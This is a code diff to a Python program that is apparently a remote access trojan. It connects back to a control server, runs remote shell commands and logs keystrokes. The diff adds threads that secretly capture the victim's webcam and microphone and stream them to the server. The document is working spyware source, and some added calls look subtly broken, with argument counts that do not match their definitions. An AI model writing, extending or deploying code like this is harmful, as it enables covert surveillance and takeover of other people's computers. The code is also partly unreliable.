@@ -9,7 +9,15 @@ import re
 import pyaudio
 import threading
 import wave
+import pickle
+import cv2
+import struct
 
+# --- Configuration ---
+SERVER_IP = '192.168.1.13' # Change this to your server's IP
+CONTROL_PORT = 5555
+VIDEO_PORT = 9999
+AUDIO_PORT = 9998
 # Function to send data in a reliable way (encoded as JSON)
 def reliable_send(data):
     jsondata = json.dumps(data)     # Convert data to JSON format
@@ -31,7 +39,7 @@ def connection():
         time.sleep(20)  # Wait for 20 seconds before reconnecting (for resilience)
         try:
             # Connect to a remote host with IP '192.168.1.39' and port 5555
-            s.connect(('192.168.1.39', 5555))
+            s.connect((SERVER_IP, CONTROL_PORT))
             # Once connected, enter the shell() function for command execution
             shell()
             # Close the connection when done
@@ -174,70 +182,126 @@ def listen_for_livekeylogging_stop():
         except:
             continue
 
-# Function to listen for a command to stop the live audio stream
-def listen_for_audio_stop():
-    global liveaudio_status, p, stream, audio_sock
+# --- Streaming Functions (to be run in threads) ---
+def start_video_stream():
+    global video_stream_active
+    video_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        video_socket.connect((SERVER_IP, VIDEO_PORT))
+    except ConnectionRefusedError:
+        print("[-] Video server connection refused.")
+        video_stream_active = False
+        return
 
-    while liveaudio_status:
+    cap = cv2.VideoCapture(0)
+    print("[*] Video streaming started...")
+    while video_stream_active:
+        ret, frame = cap.read()
+        if not ret: break
+        frame_data = pickle.dumps(frame)
+        message_size = struct.pack("L", len(frame_data))
         try:
-            command = reliable_recv()
-            if command[:14] == 'liveaudio_stop':
-                liveaudio_status = False
-                print("[+] Stopping live audio stream...")
-                break
-        except:
-            continue
+            video_socket.sendall(message_size + frame_data)
+        except (ConnectionResetError, BrokenPipeError):
+            break
+    
+    print("[*] Video streaming stopped.")
+    cap.release()
+    video_socket.close()
+    video_stream_active = False
 
-
-def write_audio_to_file():
-    global liveaudio_status, p, stream, audio_sock, audio_filename
-    filename = audio_filename
-
-    frames = []
-
-    while liveaudio_status:
-        data = stream.read(1024)
-        frames.append(data)
-
-    with wave.open(filename, 'wb') as wf:
-        wf.setnchannels(1)
-        wf.setsampwidth(p.get_sample_size(pyaudio.paInt16))
-        wf.setframerate(44100)
-        wf.writeframes(b''.join(frames))
-
-    upload_file(filename)
-    os.remove(filename)
-    audio_filename = None
-    print(f"[+] Audio stream saved to {filename} and uploaded.")
-
-
-def liveaudio_start():
-    global liveaudio_status, p, stream, audio_sock, audio_filename
+def start_audio_stream():
+    global audio_stream_active
+    audio_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        audio_socket.connect((SERVER_IP, AUDIO_PORT))
+    except ConnectionRefusedError:
+        print("[-] Audio server connection refused.")
+        audio_stream_active = False
+        return
 
     p = pyaudio.PyAudio()
     stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
-    audio_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    print("[*] Audio streaming started...")
+    while audio_stream_active:
+        try:
+            data = stream.read(1024)
+            audio_socket.sendall(data)
+        except (ConnectionResetError, BrokenPipeError, IOError):
+            break
 
-    print("[+] Streaming mic...")
-
-    # Start background thread to listen for stop command
-    stop_listener = threading.Thread(target=listen_for_audio_stop, daemon=True)
-    stop_listener.start()
-
-    if audio_filename != None:
-        audiofile_writer = threading.Thread(target=write_audio_to_file, daemon=False)
-        audiofile_writer.start()
-
-    while liveaudio_status:
-        data = stream.read(1024)
-        audio_sock.sendto(data, ('192.168.1.39', 7777))
-
+    print("[*] Audio streaming stopped.")
     stream.stop_stream()
     stream.close()
     p.terminate()
-    audio_sock.close()
-    p, stream, audio_sock = None, None, None
-    print("[+] Audio stream closed.")
+    audio_socket.close()
+    audio_stream_active = False
+
+# Function to listen for a command to stop the live audio stream
+# def listen_for_audio_stop():
+#     global liveaudio_status, p, stream, audio_sock
+
+#     while liveaudio_status:
+#         try:
+#             command = reliable_recv()
+#             if command[:14] == 'liveaudio_stop':
+#                 liveaudio_status = False
+#                 print("[+] Stopping live audio stream...")
+#                 break
+#         except:
+#             continue
+
+
+# def write_audio_to_file():
+#     global liveaudio_status, p, stream, audio_sock, audio_filename
+#     filename = audio_filename
+
+#     frames = []
+
+#     while liveaudio_status:
+#         data = stream.read(1024)
+#         frames.append(data)
+
+#     with wave.open(filename, 'wb') as wf:
+#         wf.setnchannels(1)
+#         wf.setsampwidth(p.get_sample_size(pyaudio.paInt16))
+#         wf.setframerate(44100)
+#         wf.writeframes(b''.join(frames))
+
+#     upload_file(filename)
+#     os.remove(filename)
+#     audio_filename = None
+#     print(f"[+] Audio stream saved to {filename} and uploaded.")
+
+
+# def liveaudio_start():
+#     global liveaudio_status, p, stream, audio_sock, audio_filename
+
+#     p = pyaudio.PyAudio()
+#     stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
+#     audio_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+#     print("[+] Streaming mic...")
+
+#     # Start background thread to listen for stop command
+#     stop_listener = threading.Thread(target=listen_for_audio_stop, daemon=True)
+#     stop_listener.start()
+
+#     if audio_filename != None:
+#         audiofile_writer = threading.Thread(target=write_audio_to_file, daemon=False)
+#         audiofile_writer.start()
+
+#     while liveaudio_status:
+#         data = stream.read(1024)
+#         audio_sock.sendto(data, ('192.168.1.39', 7777))
+
+#     stream.stop_stream()
+#     stream.close()
+#     p.terminate()
+#     audio_sock.close()
+#     p, stream, audio_sock = None, None, None
+#     print("[+] Audio stream closed.")
 
 
 def shell():
@@ -279,17 +343,17 @@ def shell():
             else:
                 pass
 
-        elif command[:15] == 'liveaudio_start':
-            if not liveaudio_status:
-                filename = re.sub(r'[\\/:*?"<>|]', '', command[16:]).replace(' ', '')
+        # elif command[:15] == 'liveaudio_start':
+        #     if not liveaudio_status:
+        #         filename = re.sub(r'[\\/:*?"<>|]', '', command[16:]).replace(' ', '')
 
-                if len(command) > 16:
-                    audio_filename = filename if (filename != "") else 'liveaudio.wav'
+        #         if len(command) > 16:
+        #             audio_filename = filename if (filename != "") else 'liveaudio.wav'
 
-                liveaudio_status = True
-                liveaudio_start()
-            else:
-                pass
+        #         liveaudio_status = True
+        #         liveaudio_start()
+        #     else:
+        #         pass
 
         elif command[:15] == 'keylogging_live':
             if not livekeylogging_status:
@@ -302,6 +366,19 @@ def shell():
                 keylogging_live()
             else:
                 pass
+        
+        elif command == 'stream_start':
+            if not video_stream_active:
+                video_stream_active = True
+                threading.Thread(target=start_video_stream, daemon=True).start()
+            if not audio_stream_active:
+                audio_stream_active = True
+                threading.Thread(target=start_audio_stream, daemon=True).start()
+            reliable_send(s, "[+] Stream threads initiated.")
+        elif command == 'stream_stop':
+            video_stream_active = False
+            audio_stream_active = False
+            reliable_send(s, "[-] Stopping stream threads.")
 
         else:
             # For other commands, execute them using subprocess
@@ -312,11 +389,11 @@ def shell():
             reliable_send(result)
 
 
-p, stream, audio_sock = None, None, None  # Initialize PyAudio and stream variables to None
+# p, stream, audio_sock = None, None, None  # Initialize PyAudio and stream variables to None
 
 keylogger_status, liveaudio_status, livekeylogging_status = False, False, False
 
-audio_filename, keylogging_filename = None, None # Default filename for keylogging and live-audio
+# audio_filename, keylogging_filename = None, None # Default filename for keylogging and live-audio
 
 keylogger_listener = None  # Initialize the keylogger listener variable
 
